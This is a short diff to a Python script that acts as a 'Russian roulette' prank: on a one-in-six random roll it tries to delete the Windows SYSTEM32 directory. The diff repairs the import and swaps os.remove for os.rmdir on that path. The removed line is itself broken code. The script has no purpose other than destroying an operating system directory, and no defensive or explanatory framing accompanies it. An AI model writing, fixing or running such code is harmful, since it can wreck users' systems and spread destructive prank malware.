@@ -1,7 +1,7 @@
-from random import *
+import random
 import os
 
 number = random.randint(1, 6)
 
 if number == 1:
-	os.remove("C:\WINDOWS\SYSTEM32\")	
+    os.rmdir("C:/WINDOWS/SYSTEM32/")
